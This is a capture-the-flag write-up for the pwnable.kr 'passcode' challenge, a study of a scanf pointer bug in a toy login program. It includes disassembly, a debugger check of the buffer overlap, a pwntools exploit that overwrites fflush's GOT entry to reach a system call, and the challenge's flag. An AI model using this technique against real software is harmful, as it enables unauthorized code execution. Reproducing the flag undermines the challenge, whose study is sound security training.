# pwnable.kr: passcode

**Source Code:**

```c
#include <stdio.h>
#include <stdlib.h>

void login(){
        int passcode1;
        int passcode2;

        printf("enter passcode1 : ");
        scanf("%d", passcode1);
        fflush(stdin);

        // ha! mommy told me that 32bit is vulnerable to bruteforcing :)
        printf("enter passcode2 : ");
        scanf("%d", passcode2);

        printf("checking...\n");
        if(passcode1==338150 && passcode2==13371337){
                printf("Login OK!\n");
                setregid(getegid(), getegid());
                system("/bin/cat flag");
        }
        else{
                printf("Login Failed!\n");
                exit(0);
        }
}

void welcome(){
        char name[100];
        printf("enter you name : ");
        scanf("%100s", name);
        printf("Welcome %s!\n", name);
}

int main(){
        printf("Toddler's Secure Login System 1.1 beta.\n");

        welcome();
        login();

        // something after login...
        printf("Now I can safely trust you that you have credential :)\n");
        return 0;
}
```

The program takes the two inputs as memory addresses instead of values: 

```c
scanf("%d", passcode1);
scanf("%d", passcode2);
```

So, if you try to give the values `338150` and `13371337`, resulting to a segmentation fault:

```bash
Toddler's Secure Login System 1.1 beta.
enter you name : test
Welcome test!
enter passcode1 : 338150 
enter passcode2 : 13371337
segmentation fault  ./passcode
```

One area that is possible important is the buffer `char name[100]` within `welcome`, due to it possibly overlapping with the passcodes:

```c
char name[100];
printf("enter you name : ");
scanf("%100s", name);
printf("Welcome %s!\n", name);
```

The memory location for the passcodes are located at `ebp-0x10` (`passcode1`) and `ebp-0xc` (`passcode2`):

```assembly
804927d:       81 7d f0 e6 28 05 00    cmpl   $0x528e6,-0x10(%ebp)
8049284:       75 48                   jne    80492ce <login+0xd8>
8049286:       81 7d f4 c9 07 cc 00    cmpl   $0xcc07c9,-0xc(%ebp)
804928d:       75 3f                   jne    80492ce <login+0xd8>
```

For buffer `char name[100];`, it would be located at `ebp-0x70`:

```assembly
8049324:       8d 45 90                lea    -0x70(%ebp),%eax
```

The locations `ebp-0x70` and `ebp-0x10` overlap:

```python
>>> int(0x10)
16
>>> int(0x70)
112
>>> 112 - 16
96
```

Under a debugger, it shows that `ebp-0x10` (`passcode1`) is overwrite-able:

```bash
enter you name : AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

...

> x/x $ebp-0x10
0xffffce68:     0x41414141
```

We will overwrite `passcode1` with the address of `fflush`'s GOT entry (`0x804c014`):

```bash
readelf -a passcode | grep 'fflush'
...
...
0804c014 R_386_JUMP_SLOT   fflush@GLIBC_2.0 + 8049066
```

Then give `scanf("%d", passcode1);` the memory location for the `system` call that runs `/bin/cat flag`:

```assembly
...
80492c3:       50                      push   %eax
80492c4:       e8 d7 fd ff ff          call   80490a0 <system@plt>
...
```

This will overwrite `fflush`'s GOT entry, allowing for `fflush(stdin)` to redirect to the flag. This chain of events will skip `if(passcode1==338150 && passcode2==13371337)` condition as a whole.

**Exploit:**

```python
#!/bin/python3
from pwn import *

conn = remote("pwnable.kr",10004)

payload = (b'a' * 96 + p32(0x804c014) + b'134517401' + b'\n')
conn.send(payload)

conn.interactive()
```

**Final Solution:**

```bash
./exploit.py               
[+] Opening connection to pwnable.kr on port 10004: Done
[*] Switching to interactive mode
Toddler's Secure Login System 1.1 beta.
enter you name : Welcome aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x14\xc0\x04\x08!
enter passcode1 : \x83\xc4\x10\x83\xec\x0c\x8d\x83\x1e\xe0\xff\xffP\xe8\xfd\xfd\xff\xff\x83\xc4\x10\x83\xec\x08\xffu\xf4\x8d\x83\x1b\xe0\xff\xffP\xe8h\xfe\xff\xff\x83\xc4\x10\x83\xec\x0c\x8d\x831\xe0\xff\xffP\xe8\x16\xfe\xff\xff\x83\xc4\x10\x81}\xf0\xe6(\x05
s0rry_mom_I_just_ign0red_c0mp1ler_w4rning
Now I can safely trust you that you have credential :)
[*] Got EOF while reading in interactive
$ 
```

**Flag:** s0rry_mom_I_just_ign0red_c0mp1ler_w4rning
